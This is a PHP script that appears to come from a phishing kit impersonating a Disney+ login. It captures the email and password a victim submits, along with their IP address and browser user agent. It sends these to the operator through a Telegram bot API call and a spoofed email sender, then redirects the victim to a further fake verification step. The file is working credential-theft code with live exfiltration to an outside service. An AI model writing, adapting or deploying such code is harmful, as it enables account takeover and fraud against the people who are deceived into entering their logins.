<?php
  error_reporting(0);
  ob_start();
  session_start();
include '../../email.php';
include '../../config2.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
  $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
	$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];
  $_SESSION['email']  = $_POST['mail'];
  $_SESSION['pass']   = $_POST['pass'];
$msg = nl2br("Email : {$_SESSION['email']} \n Mdp : {$_SESSION['pass']} \n IP : "._ip());
$Subject="+1 Log | ".$_SESSION['email']." | "._ip();
$head  = 'MIME-Version: 1.0' . "\r\n";
$head .= 'Content-type: text/html; charset="utf-8"' . "\r\n";
$head .="From: Koda <rez@account-verif.com> \r\n" .
'X-Mailer: PHP/' . phpversion();

if($tlg_send == true)
{
  $data = [
    'text' => '
[🎓] KIM x DISNEY +1 LOG [🎓]

🪐Email : '.$_POST["mail"].'
🪐 Mot de passe : '.$_POST["pass"].'

[🔋] Tiers [🔋]
        
🌐 Adresse Ip : '.$_SESSION['ip'].'
👤 User-agent : '.$_SESSION['useragent'].'   
'
  ];
  
  file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id={$chat}&".http_build_query($data) );// Don't delete
}
if ($mail_send == true)
{
  mail($my_mail, $Subject, $msg, $head);
}
$_SESSION['step_one']  = true;
header('location: ../problems.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>